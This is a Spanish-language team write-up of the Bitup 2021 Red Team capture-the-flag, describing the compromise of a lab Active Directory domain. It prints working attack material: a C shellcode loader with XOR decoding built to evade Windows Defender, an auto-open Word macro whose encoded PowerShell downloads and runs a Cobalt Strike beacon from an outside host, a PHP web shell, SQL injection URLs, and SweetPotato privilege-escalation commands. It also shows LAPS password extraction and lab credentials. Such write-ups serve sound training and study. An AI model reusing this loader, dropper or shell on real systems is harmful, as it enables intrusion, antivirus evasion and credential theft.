# Introducción


>El objetivo del reto es comprometer a la Empresa "La Ciberreserva". La idea es simular lo que podría ser la infraestructura de una empresa real con la que te encontrarías en un ejercicio de Red Team. Este reto no esta centrado en la evasión, pero es posible que tengas que hacer un uso mínimo de ello para avanzar en tu fase de compromiso.
>
>Hay un total de 8 flags repartidas en las 6 máquinas del dominio. Las flags siguen el formato de bitup21{MD5}, y en la descripción de cada Challenge podrás ver la ruta donde se encuentran. 
>
>Puedes usar las herramientas con las que te sientas más cómodo, de hecho recomendamos utilizar algún Framework de C2 como Metasploit, Covenant, Empire o Cobaltstrike. Eso ya lo dejamos a tu gusto.
>
>Unas consideraciones finales:
>
>- Todo ejercicio de Red Team comienza por una fase de **OSINT**. Así que no os centreis sólo en las máquinas visibles de la VPN.
>- No te lies con la enumeración de subdominios de ciberreserva.com. Este tan sólo es el dominio principal y la única web externa que deberías tener en cuenta.
>- Sobretodo piensa antes de tirarte de lleno con algo, ten muy en cuenta como podemos haber montado el reto y sobretodo las reglas citadas anteriormente. Si tienes esto en mente, te ayudará a encontrar el camino correcto.
>
>Y ahora si, te deseo mucha suerte a ti y a tu equipo en esta aventura! Preparate...por que vas a sudar la gota gorda (;


# Infraestructura

De las instrucciones entendemos que será necesario pivotar y mantener persistencia al sistema, por lo que decidimos montar un Teamserver de Cobalt Strike (100% legítimo, de un señor cuyo nombre era algo como zorro libre). 

Cada miembro del equipo ejecuta su propia VM Kali Linux, dentro de un host Proxmox y en la misma LAN. El Teamserver se ejecuta en una de las VMs, compartiendo así el acceso entre los miembros.

Para tomar notas y compartir información hemos usado CTFNote.


## Windows Defender

Uno de los mayores problemas que nos hemos encontrado a lo largo de todo el CTF ha sido Windows Defender. Sin exagerar, tool o exe que subíamos, tool que borraba inmediatamente. Cosas que hemos probado, sin éxito:
- Ejecutar desde Powershell desactivando AMSI.
- Utilizar versiones ofuscadas existentes de los binarios.
- Crear nuestras propias versiones ofuscadas con PEzor.
- Empaquetar los binarios con diferentes herramientas existentes.

Para hacer pruebas, creamos una VM Windows 10 actualizada, con Windows Defender activado pero el envío de muestras a Microsoft apagado.

Al final, nos dimos cuenta que cuando intentábamos ocultar una herramienta cualquiera, Windows Defender no estaba detectando la propia herramienta ofuscada o empaquetada, si no el método concreto que estábamos usando para intentar colársela. Así que utilizamos nuestro propio método cutre, basado en un simple XOR.

```C
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <stdlib.h>
#include <malloc.h>
#include <fcntl.h>
#include <intrin.h>

typedef void (*FUNCPTR)(); 

int main(int argc, char **argv)
{
    FUNCPTR helloworldrun;
    void *buf;
    int fd, len;
    char *filename;
    DWORD oldProtect;

    if (argc == 2) {
        filename = argv[1];
    } else {
       fprintf(stderr, "Ya tu sabe lo que me falta");
       return 1;
    }

    fd = _open(filename, _O_RDONLY | _O_BINARY);

    if (-1 == fd) {
        fprintf(stderr, "Error abriendo el ficherito");
        return 1;
    }

    len = _filelength(fd);

    if (-1 == len) {
        fprintf(stderr, "Menuda tula, -1");
        return 1;
    }

    buf = malloc(len);

    if (NULL == buf) {
        fprintf(stderr, "Me has fallado malloc");
        return 1;
    }
	
    if (0 == VirtualProtect(buf, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        fprintf(stderr, "Error con la memoria del puto ejecutable de mierda que no funciona: error code %d\n", GetLastError());
        return 1;
    }        
    if (len != _read(fd, buf, len)) {
        fprintf(stderr,"Error de lectura");
        return 1;
    }

    helloworldrun = (FUNCPTR)buf;

    char cavero[] = "holikarakoli!";
    for(int i = 0; i<len;i++){
        int j = i % 13;
        buf[i] = buf[i] ^ cavero[j];
    }
    helloworldrun();
    return 0;
}
```

Para usarlo, ciframos el shellcode a ejecutar en Cyberchef con una clave XOR arbitraria y lo subimos junto a nuestro helloworld.exe al servidor correspondiente. Ejecutar cualquier shellcode es tan fácil como: `helloworld.exe cobaltbeacon`, ¡y Windows Defender ya no se queja!


![](https://i.imgur.com/S3girQB.png)




# Reconocimiento inicial

Utilizando nmap, vemos que dos máquinas responden: `192.168.56.111`(Lambda) y el router `192.168.56.1` (fuera de scope)

# Omega - Acceso inicial

Lambda es la primera máquina a la que tenemos acceso en la red del laboratorio, revisando los puertos abiertos, vemos la interfaz web del servidor de correo en el puerto `443`.
```text
nmap scan report for 192.168.56.111
Host is up (0.062s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft Exchange smtpd
| smtp-commands: LAMBDA.CIBERRESERVA.COM Hello [192.168.56.1], SIZE 37748736, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XRDST, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: CIBERRESERVA
|   NetBIOS_Domain_Name: CIBERRESERVA
|   NetBIOS_Computer_Name: LAMBDA
|   DNS_Domain_Name: CIBERRESERVA.COM
|   DNS_Computer_Name: LAMBDA.CIBERRESERVA.COM
|   DNS_Tree_Name: CIBERRESERVA.COM
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=LAMBDA
| Subject Alternative Name: DNS:mail.ciberreserva.com, DNS:autodiscover.ciberreserva.com, DNS:lambda.ciberreserva.com
| Not valid before: 2021-09-24T22:44:53
|_Not valid after:  2026-09-24T22:44:53
|_ssl-date: 2021-10-25T17:44:33+00:00; -4m43s from scanner time.
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
81/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Prohibido: acceso denegado.
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Outlook
|_Requested resource was https://192.168.56.111/owa/auth/logon.aspx?url=https%3a%2f%2f192.168.56.111%2fowa%2f&reason=0
| ssl-cert: Subject: commonName=LAMBDA
```

Mientras, otro miembro del grupo estaba revisando las redes sociales y repositorios de código de la empresa, encontrando las credenciales de acceso en el perfil de GitHub de Benito Antoñanzas (https://github.com/benito-antonanzas/), que sabemos que pertenece a la organización por su perfil de LinkedIn (https://es.linkedin.com/in/benito-anto%C3%B1anzas-01305b220).

Revisando los commits de ADTools, nos encontramos con algo interesante: hay un commit con credenciales de acceso:

![](https://i.imgur.com/kk3hH3I.png)<p style="text-align: center;"><caption >*URL del commit: https://github.com/benito-antonanzas/ADTools/commit/77d0c1923263dc10ad77f4a03259833fd38330cd*</caption></p>

Con estas credenciales podemos hacer login en el portal OWA y revisar los correos enviados y recibidos por Benito, así como los elementos eliminados. Revisando estos últimos, parece que hay varios correos dirigidos a Angel Rubio (https://es.linkedin.com/in/%C3%A1ngel-rubio-b769a3216), que también pertenece a la organización. 

El contenido de estos correos es sospechoso, dado que se trata de documentos de Word (.doc) que contienen macros de Office. Analizando estas macros, nos damos cuenta de que se está probando un hipotético phising a Angel Rubio.

![](https://i.imgur.com/gCgLPGL.png)<p style="text-align: center;"><caption >*Cuenta de correo de Benito Antoñanzas*</caption></p>

Con esta información, asumimos que si enviamos un documento Word con macros a Angel Rubio este lo abrirá, y podremos tener nuestra primera shell. Aquí es donde estuvimos atascados bastante tiempo, gracias a Windows Defender. 

Tras varios intentos de prueba y error, con ficheros tanto xlsm como docm, logramos encontrar la macro que nos proporciona acceso a la máquina:

```vbscript=
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Rem Attribute VBA_ModuleType=VBAModule

Sub autoopen()
pepo = "JABkAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAA9ACAAJABlAG4AdgA6AFQARQBNAFAAIAArACAAJwBcAGwAbwBjAGEAbABjAGkAZgByAGEAZABhAC4AYgBpAG4AJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQA2ADoAOAAwAC8AZAAvAGMAdABmAGMAaQBmAHIAYQBkAGEALgBiAGkAbgAnACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AGkAbgBhAHQAaQBvAG4AOwAgACAAJABkAGUAcwB0AGkAbgBhAHQAaQBvAG4AMQAgAD0AIAAkAGUAbgB2ADoAVABFAE0AUAAgACsAIAAnAFwAaABlAGwAbABvAC4AZQB4AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQA2ADoAOAAwAC8AZAAvAGgAZQBsAGwAbwAuAGUAeABlACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGQAZQBzAHQAaQBuAGEAdABpAG8AbgAxADsAIAAgAGMAZAAgACQAZQBuAHYAOgBUAEUATQBQADsAIAAmACAAJwAuAFwAaABlAGwAbABvAC4AZQB4AGUAJwAgACcALgBcAGwAbwBjAGEAbABjAGkAZgByAGEAZABhAC4AYgBpAG4AJwAgAA=="
paco = "powershell.exe -executionpolicy bypass -encoded " & pepo
CreateObject("WSc" & "ri" & "pt" & ".Sh" & "ell").Exec (paco)
End Sub
```

El código Powershell se descarga el `helloworld.exe` y un beacon de Cobalt Strike y lanza el comando `helloworld.exe beacon.bin`. Conseguimos así la primera shell y la primera flag, en el escritorio de Angel Rubio:

```
bitup21{472197a8a5665669cb579513b2d18f75}
```


# Kappa - Acceso inicial

Analizando más a fondo los mails de Benito Antoñanzas encontramos otro bastante interesante de Angel Rubio que dice lo siguiente:


*Hola Benito,*

*Escucha, estoy probando lo que te comenté del proyecto del cliente de Exchange. Con mis credenciales parece que funciona correctamente. Me ha costado bastante, así que no me lo borres, lo tienes en C:\ExchangeCli por si quieres echarle un vistazo.*

*Un saludo*

Accediendo a esta ruta, encontramos el ejecutable del que se habla. Haciendo reversing al fichero usando dotPeek, vemos que se trata de una app .NET que contiene las credenciales de Angel Rubio.

![](https://i.imgur.com/VKPXx1n.png)<p style="text-align: center;"><caption >*Reversing al fichero ExchangeCli, obteniendo las credenciales*</caption></p>

Concretamente, encontramos las credenciales hardcodeadas en estas líneas:

```csharp
private string exchange_url = "https://mail.ciberreserva.com/EWS/Exchange.asmx";
private string domain_user = "ciberreserva\\arubio";
private string domain_password = "P4g4F4nt4sSupr3m3!";
private string mail_from = "benito.antonanzas@ciberreserva.com";
private string attachments_path = "C:\\Users\\arubio\\Downloads\\";
```
## Email Angel Rubio

Con las credenciales obtenidas, hacemos login en la cuenta de mail de Angel Rubio, donde encontramos un correo de Luis Prieto (https://es.linkedin.com/in/luis-prieto-987949216) que también es bastante interesante:

*Hola Angel,*

*Necesito que traslades la información que ha pasado Antoñanzas a la plataforma de ciberinteligencia. Recuerda que puedes acceder a ella aquí: http://kappa.ciberreserva.com:8000/*

*Un saludo*
*Luis Prieto
Coronel en Ciberreserva*

Procedemos entonces a añadir el dominio a nuestro fichero `/etc/host` para acceder, y configurar la máquina que hemos comprometido previamente como proxy, utilizando la opción Socks4 de Cobalt Strike, el plugin para Firefox FoxyProxy y proxychains para curl y otras herramientas que necesitemos usar de terminal.

## Portal ciberinteligencia

Nos encontramos un portal web, con un endpoint `/login.php`.

![](https://i.imgur.com/k1rjGlZ.png)<p style='text-align: center'><caption >*Entrada al portal web de Kappa*</caption></p>

![](https://i.imgur.com/tvkoA5X.png)<p style='text-align: center'><caption >*Endpoint de login*</caption></p>

Analizando el comportamiento de la web, vemos que si hacemos click en un post, se accede a post.php?id=<id del post>. Haciendo una SQLi con OR, obtenemos todos los post:

http://kappa.ciberreserva.com:8000/post.php?id=3%27%20or%20%271%27=%271

Utilizamos SQLMap para exfiltrar toda la información posible, obteniendo cuentas de email y hashes de contraseñas cifradas con bcrypt.

```text
Database: cbms
Table: users
[4 entries]
+----+------------------------------------+--------------------------------------------------------------+
| id | email                              | password                                                     |
+----+------------------------------------+--------------------------------------------------------------+
| 1  | luis.tamayo@ciberreserva.com       | $2y$10$3cQ7a4uf9EpnxT8.9NAGs.sX5wxPR05tcRVWCrY/Yd4w0PapuWRyS |
| 2  | luis.prieto@ciberreserva.com       | $2y$10$Ln.cj4k0AFQNJyqBYPCK..a7C.Jo7iIlAQ4dKUMbod9V/K8GObMBC |
| 3  | roberto.suarez@ciberreserva.com    | $2y$10$JMHgBohXO67Bzizl72TPwuGSJh9GbWf.UO/2p298QefmpOCfrJH.2 |
| 4  | benito.antonanzas@ciberreserva.com | $2y$10$ZM67hNDBVRT8W7vd9Lb2i.PuckcV0q4dYuHJVrwytM1MkfgPhbDMm |
+----+------------------------------------+--------------------------------------------------------------+


Table: posts
[9 entries]
+----+------------+-----------------------------------------------------------------------------------------+----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | image      | title                                                                                   | comments | description                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+----+------------+-----------------------------------------------------------------------------------------+----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 148932.png | Leveraging API Hooking for code deobfuscation with Frida                                | 3        | In this post we will discuss how to employ API hooking, a technique mostly used for binary targets, to deobfuscate malicious scripts. We will use the Frida framework to extract some key information for the analyst, such as the lists of C2 servers within the scripts, in some cases bypassing the obfuscation almost automatically.                                                                                                                           |
| 2  | 148933.png | The State of Ransomware in 2021                                                         | 5        | Rising to new levels of notoriety in 2020 as criminals sought to take advantage of the global chaos brought about by the COVID 19 pandemic, ransomware has continued to grow in maturity throughout the first half of 2021.                                                                                                                                                                                                                                        |
| 3  | 148934.png | Use of Initial Access Brokers by Ransomware Groups                                      | 2        | Initial Access Brokers (IABs) are financially motivated threat actors that profit through the sale of remote access to corporate networks in underground forums, like Exploit, XSS, or Raidforums. The type of accesses offered are mostly Remote Desktop Protocol (RDP), Virtual Private Network (VPN), web shells, and remote access software tools offered by companies such Citrix, Pulse Secure, Zoho, or VMware.                                             |
| 4  | 148935.png | Massive Kaseya attack demands up to $70 million ransom from more than 200 US businesses | 4        | Florida based IT company Kaseya has been targeted in a colossal ransomware attack, believed to be at the hands of the Russia linked REvil group taking advantage of an existing vulnerability in its servers. The attack happened on Friday 2nd July, as businesses across the US wound down for the long Independence Day weekend.                                                                                                                                |
| 5  | 148936.png | The threat landscape in 2021 (so far)                                                   | 6        | The past 18 months from the rapid adoption of remote working, innovative new technologies being trialed and tested the world over, to pandemic fueled emotions have been the perfect conditions for cybercrime to thrive. Cybercriminals have shown no sign of slowing down in 2021 and, as we approach the halfway point and the gradual climb out of the COVID 19 pandemic, they are still not short of sophisticated and malicious ways to achieve their goals. |
| 6  | 148937.png | Dispelling ROCKYOU2021                                                                  | 1        | As you may already be aware, a user recently made available a compilation of passwords dubbed ROCKYOU2021 on an underground forum and has since then shared on multiple sites. At Blueliv, we have already seen a few misconceptions regarding this compilation, from news outlets and regular users alike. During this blogpost, we will try to clarify exactly what ROCKYOU2021 is.                                                                              |
| 7  | 148938.png | The most critical vulnerabilities right now                                             | 4        | We may not yet be at the halfway point of 2021 but, over the course of the past 4 and a half months, Blueliv has already observed over 4,900 critical CVEs spanning widely used products from global vendors such as Panasonic, Cisco, Microsoft, and of course SolarWinds. It is clear that threat actors are still capitalizing on scattered, remote workforces, as evidenced in the platforms they are exploiting (Cisco Small Business, SAP Commerce Cloud).   |
| 8  | 148939.png | An In Depth analysis of the new Taurus Stealer                                          | 8        | Taurus Stealer, also known as Taurus or Taurus Project, is a C C++ information stealing malware that has been in the wild since April 2020. The initial attack vector usually starts with a malspam campaign that distributes a malicious attachment, although it has also been seen being delivered by the Fallout Exploit Kit.                                                                                                                                   |
| 9  | 148940.png | Over One Million Clubhouse User Records Leaked                                          | 3        | This week was reported that user data from from over 1.3 million user records was leaked from the popular social media application Clubhouse, after being  scraped from an SQL database and leaked online via a popular hacker forum. This is the latest in a series of successful social media breaches in 2021, happening just days after Facebook and LinkedIn saw more than a billion user profiles scraped and put to auction online.                         |
+----+------------+-----------------------------------------------------------------------------------------+----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```
Descartamos la idea de hacer fuerza bruta sobre estos hashes, teniendo en cuenta que las credenciales descubiertas con anterioridad siguen una política que nos indica que es poco probable que las encontremos en un diccionario, además de estar cifradas con bcrypt, que requiere demasiado esfuerzo computacional para romperse.

Intentamos insertar un user en la tabla, pero no funciona (probablemente porque las stacked queries están bloqueadas):
```sql
insert into users(email, password) values ('jefaso@tujefe.com', '$2y$10$59szyfc2uBio4wn.i8yfUuLNczb3NGWG0voVccbjX7DIOOEl8EF2m')
```
    
Analizando un poco más a fondo la información obtenida, nos damos cuenta de que existe una base de datos adicional a la que podemos acceder: fmanager.

```text
available databases [3]:
[*] cbms
[*] fmanager
[*] information_schema
```

Así que procedemos a volcar la información de esta base de datos

```text
Database: fmanager
Table: users
[3 entries]
+----+----------------------------------+--------+
| id | pass                             | email  |
+----+----------------------------------+--------+
| 1  | fe01ce2a7fbac8fafaed7c982a04e229 | demo   |
| 2  | b4c8500e006e564cc823b1e87f216e7e | admin  |
| 3  | b9918b9f19418fa37932afc957d2411c | benito |
+----+----------------------------------+--------+

Database: fmanager
Table: files
[61 entries]
+----+------------------------------------------------+-----------------------+-----------------------------------------------------------------------------+--------+---------------------+
| id | name                                           | type                  | path                                                                        | author | timestamp           |
+----+------------------------------------------------+-----------------------+-----------------------------------------------------------------------------+--------+---------------------+
| 1  | data.json                                      | application/json      | /var/www/html/files/data.json                                               | benito | 2021-09-20T00:06:38 |
| 2  | data.xml                                       | application/xml       | /var/www/html/files/data.xml                                                | benito | 2021-09-20T00:26:38 |
| 3  | 148932.png                                     | image/png             | /var/www/html/files/148932.png                                              | benito | 2021-09-20T01:37:55 |
| 4  | slider_1.jpg                                   | image/jpeg            | /var/www/html/files/slider_1.jpg                                            | benito | 2021-09-21T09:10:00 |
| 5  | bootstrap.min.js                               | text/javascript       | /var/www/html/files/bootstrap.min.js                                        | benito | 2021-09-21T10:35:21 |
| 6  | 148940.png                                     | image/png             | /var/www/html/files/148940.png                                              | benito | 2021-09-21T10:35:38 |
| 7  | logo.jpeg                                      | image/jpeg            | /var/www/html/files/logo.jpeg                                               | benito | 2021-09-21T14:23:30 |
| 16 | magicmagic.jpg.png                             | image/png             | C:\\inetpub\\wwwroot\\files\\magicmagic.jpg.png                             | demo   | 2021-10-26 03:46:40 |
| 17 | 46576284795_40d714a016_o.jpg                   | image/jpeg            | C:\\inetpub\\wwwroot\\files\\46576284795_40d714a016_o.jpg                   | demo   | 2021-10-26 04:23:48 |
| 18 | 46576284795_40d714a016_o (copia).php           | image/jpeg            | C:\\inetpub\\wwwroot\\files\\46576284795_40d714a016_o (copia).php           | demo   | 2021-10-26 04:39:02 |
| 19 | 3d-pequeña-gente-actitud-positiva-19676506.php | image/jpeg            | C:\\inetpub\\wwwroot\\files\\3d-pequeña-gente-actitud-positiva-19676506.php | demo   | 2021-10-26 04:44:03 |
| 20 | POC.gif                                        | image/gif             | C:\\inetpub\\wwwroot\\files\\POC.gif                                        | demo   | 2021-10-26 04:50:32 |
| 21 | POC.php                                        | image/gif             | C:\\inetpub\\wwwroot\\files\\POC.php                                        | demo   | 2021-10-26 04:51:20 |
| 22 | shell.aspx                                     | text/plain            | C:\\inetpub\\wwwroot\\files\\shell.aspx                                     | demo   | 2021-10-26 04:53:57 |
| 23 | cmd.aspx                                       | text/html             | C:\\inetpub\\wwwroot\\files\\cmd.aspx                                       | demo   | 2021-10-26 04:56:39 |
| 24 | disable_func_bypass.php                        | text/x-php            | C:\\inetpub\\wwwroot\\files\\disable_func_bypass.php                        | demo   | 2021-10-26 04:59:46 |
| 25 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:01:16 |
| 26 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:04:40 |
| 27 | new1.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new1.php                                       | demo   | 2021-10-26 05:05:25 
    [...]
| 60 | kaka.txt                                       | text/plain            | C:\\inetpub\\wwwroot\\files\\kaka.txt                                       | demo   | 2021-10-26 07:37:41 |
| 61 | JuicyPotato_tuneado.exe                        | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\JuicyPotato_tuneado.exe                        | demo   | 2021-10-26 07:48:33 |
| 62 | kakanew.exe                                    | application/x-dosexec 
    [...]
+----+------------------------------------------------+-----------------------+-----------------------------------------------------------------------------+--------+---------------------+
```

## File manager

Vemos que en el dump hay dos usuarios, demo y benito.
Tenemos que conseguir el login con uno de los dos usuarios para poder subir algún archivo malicioso y conseguir entrar. Si nos fijamos en las credenciales volcadas, podemos ver que se corresponden con hashes MD5, y en el caso del usuario demo, el hash es reversible y se corresponde con la palabra demo:
    
![](https://i.imgur.com/bpCx5tb.png)
    
Tratamos de hacer login sin éxito. Wat.
    
Revisando los puertos abiertos de la máquina, nos damos cuenta de que existe otro servicio corriendo en el puerto 80, al que hace alusión el nombre de la base de datos: file manager.

![](https://i.imgur.com/xfYqJnl.png)

Podemos hacer login en este servicio web con el usuario y password demo:demo

![](https://i.imgur.com/HCZKVi7.png)

Además, con estas credenciales se nos permite subir ficheros como esperábamos.

### Arriba ese ~~bacon~~ beacon

Una vez tenemos acceso al gestor de ficheros, procedemos a subir una shell en PHP llamada chell.php, con el siguiente contenido:
    
```php
<?php system($_GET['zekret']); ?>
```

Por ejemplo, a través de la siguiente petición, en la respuesta aparecerá el contenido de la carpeta actual.

```
http://kappa.ciberreserva.com/files/chell.php?zekret=dir
```
    
#### Subida de nuestro exploit

Subimos de nuevo el helloworld.exe y un smbcifrado.bin para crear un named pipe en la nueva máquina. Ejecutamos:

```bash
proxychains curl -v http://kappa.ciberreserva.com/files/chell.php?zekret=helloworld.exe+smbcifrada.bin
```

Y desde Cobalt Strike creamos un link desde la maquina que controlamos:
    
```bash
link 192.168.56.116 nombredelpipe
```

En nuestro caso concreto, este enlace es:

```
link 192.168.56.116 WkSvcPipeMgr_YLOQf5
```

![](https://i.imgur.com/EUurfkg.png)

Y obtenemos acceso a la máquina Kappa.


# Kappa - Escalando privilegios
    
    
Una vez ganado el acceso y habiendo visto que no tenemos acceso a una flag, comenzamos a intentar elevar privilegios en esta máquina. 
    
    
Los privilegios de la máquina son los siguientes:

```text
Nombre de usuario SID     
================= ========
nt authority\iusr S-1-5-17


INFORMACIÓN DE GRUPO
--------------------

Nombre de grupo                             Tipo           SID          Atributos                                                               
=========================================== ============== ============ ========================================================================
Etiqueta obligatoria\Nivel obligatorio alto Etiqueta       S-1-16-12288                                                                         
Todos                                       Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                            Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\SERVICIO                       Grupo conocido S-1-5-6      Grupo usado solo para denegar                                           
INICIO DE SESIÓN EN LA CONSOLA              Grupo conocido S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados        Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compañía                  Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LOCAL                                       Grupo conocido S-1-2-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado


INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio    Descripción                                  Estado    
======================= ============================================ ==========
SeChangeNotifyPrivilege Omitir comprobación de recorrido             Habilitada
SeImpersonatePrivilege  Suplantar a un cliente tras la autenticación Habilitada
SeCreateGlobalPrivilege Crear objetos globales                       Habilitada


INFORMACIÓN DE NOTIFICACIONES DE USUARIO
-----------------------

Notificaciones de usuario desconocidas.

Se ha deshabilitado la compatibilidad de Kerberos para el control de acceso dinámico en este dispositivo
```
Para escalar privilegios usaremos la herramienta Sweet Potato (https://github.com/uknowsec/SweetPotato), que nos permitirá elevar si utilizamos un CLSID correcto y un shellcode válido. 
    
La idea viene dada gracias a ~~que otro equipo se dejo el fichero juicypotato.tuneado.exe~~ Hacktricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato#final-thoughts, la frase clave es la siguiente:
    
```
If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
```

El CLSID para el sistema operativo concreto (Windows Server 2016) lo encontramos en https://github.com/ohpe/juicy-potato/tree/master/CLSID.

Después de unas cuantas pruebas, conseguimos acceso a través del comando:

```bash
execute-assembly /home/kali/bitupFinal/SweetPotato.exe --clsid=7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381 -p werfault.exe -l 6659 -s <shellcode>
```
    
El shellcode consiste en un beacon cobalt strike tipo SMB. Usamos el comando de Cobalt Strike `execute-assembly` para cargar la patata directamente en memoria y que Windows Defender no se enfade.

```
[+] host called home, sent: 861387 bytes
[+] received output:
Modifying SweetPotato by Uknow to support load shellcode 
Github: https://github.com/uknowsec/SweetPotato 
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery

[+] Attempting DCOM NTLM interception with CLID 7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381 on port 6659 using method Token to launch werfault.exe
[+] Intercepted and authenticated successfully, launching program
[+] Created launch thread using impersonated user NT AUTHORITY\SYSTEM
[+] OpenProcess Pid: 5824
[+] VirtualAllocEx Success
[+] QueueUserAPC Inject shellcode to PID: 5824 Success
[+] hOpenProcessClose Success


[*] QueueUserAPC Inject shellcode Success, enjoy!

```

Habiendo funcionado el shellcode, creamos un link a la nueva sesión:
    
```
link 192.168.56.116 WkSvcPipeMgr_YLOQf5
```

Y obtenemos la flag de Administrador de su escritorio.
    
Flag: `bitup21{25123457f4c7f09c3cbc326bd1e113ea}`

# Omega - Escalando privilegios
    
Una vez hemos ganado acceso como administradores, vamos a hacer un alto en el camino para analizar la red y ver a qué máquinas podemos llegar desde nuestra situación actual. Para hacer el reconocimiento de dominio utilizamos la herramienta `Bloodhound` junto al ingestor en C# `SharpHound`.

En el grafo generado por la herramienta, marcamos las máquinas que hemos comprometido y, revisando las relaciones, vemos una arista interesante: Kappa puede leer las credenciales de admin local (`ReadLAPSPassword`) de Omega.

![](https://i.imgur.com/nvJzE17.png)



Usamos el siguiente comando de powershell desde la máquina Kappa para sacar la password de admin local de Omega:
    
```powershell
Get-AdmPwdPassword -ComputerName 'OMEGA'
```

Pero no funciona porque no están las herramientas de LAPS instaladas en la máquina. Revisando la documentación, vemos que la contraseña se almacena como propiedad del ordenador en el AD, por lo que si pedimos todas las propiedades del objeto OMEGA deberíamos obtenerla.

```bash
raul beacon> powershell Get-AdComputer -Identity "OMEGA" -Properties *
[*] Tasked beacon to run: Get-AdComputer -Identity "OMEGA" -Properties *
[+] host called home, sent: 187 bytes
[+] received output:

AccountExpirationDate                : 
accountExpires                       : 9223372036854775807
AccountLockoutTime                   : 
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : CIBERRESERVA.COM/LAPS/Devel 
                                       Servers/OMEGA
Certificates                         : {}
CN                                   : OMEGA
codePage                             : 0
CompoundIdentitySupported            : {False}
countryCode                          : 0
Created                              : 05/08/2021 0:50:21
createTimeStamp                      : 05/08/2021 0:50:21
Deleted                              : 
Description                          : 
DisplayName                          : 
DistinguishedName                    : CN=OMEGA,OU=Devel 
                                       Servers,OU=LAPS,DC=CIBERRESERVA,DC=COM
DNSHostName                          : OMEGA.CIBERRESERVA.COM
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {03/10/2021 19:35:02, 03/10/2021 
                                       19:27:16, 03/10/2021 19:15:36, 
                                       03/10/2021 19:15:28...}
Enabled                              : True
HomedirRequired                      : False
HomePage                             : 
instanceType                         : 4
IPv4Address                          : 192.168.56.110
IPv6Address                          : 
isCriticalSystemObject               : False
isDeleted                            : 
KerberosEncryptionType               : {RC4, AES128, AES256}
LastBadPasswordAttempt               : 
LastKnownParent                      : 
lastLogoff                           : 0
lastLogon                            : 132797630552018108
LastLogonDate                        : 22/10/2021 15:28:31
lastLogonTimestamp                   : 132793829118169111
localPolicyFlags                     : 0
Location                             : 
LockedOut                            : False
logonCount                           : 215
ManagedBy                            : 
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 22/10/2021 15:28:31
modifyTimeStamp                      : 22/10/2021 15:28:31
ms-Mcs-AdmPwd                        : r[P{crR1P1ax]bM
ms-Mcs-AdmPwdExpirationTime          : 132810493315631411
msDS-SupportedEncryptionTypes        : 28
msDS-User-Account-Control-Computed   : 0
Name                                 : OMEGA
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectory
                                       Security
